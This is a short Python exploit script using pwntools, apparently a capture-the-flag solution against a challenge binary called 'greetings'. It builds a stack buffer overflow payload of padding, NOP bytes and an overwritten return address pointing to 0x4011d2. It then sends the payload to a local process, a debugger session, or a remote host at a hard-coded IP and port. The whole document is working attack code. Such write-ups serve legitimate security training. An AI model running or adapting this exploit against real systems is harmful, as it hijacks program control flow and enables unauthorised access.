from sys import argv
from pwn import *

binary = './greetings'
host, port = '20.126.227.19:57005'.split(':')
port = int(port)

e = ELF(binary, checksec=False)         # setting pwntools context os/arch
context.os = 'linux'    # so that we won't have to specify it explicitly
context.arch = e.arch   # when using pwntools functions like asm etc.

# debug and log out
context.log_level = 'info'
info("starting exploit...")


params = ""

# Command line arguments handling
if args['REMOTE']:
    target = remote(host, port)
elif args['GDB']:
    gdbscript = args['GDB'] if args['GDB'] != 'True' else 'break *&do_test+86'
    target = gdb.debug([binary,params], gdbscript=gdbscript)
else:
    target = process([binary,params])


payload = b"A" * 64 +  b"\x90" * 8
pointer = b"\xd2\x11\x40" + b"\x00" * 5

payload = payload + pointer

# sending and receiving stuff
target.recvuntil(b':\n')
target.sendline(payload)


print(target.recvall())

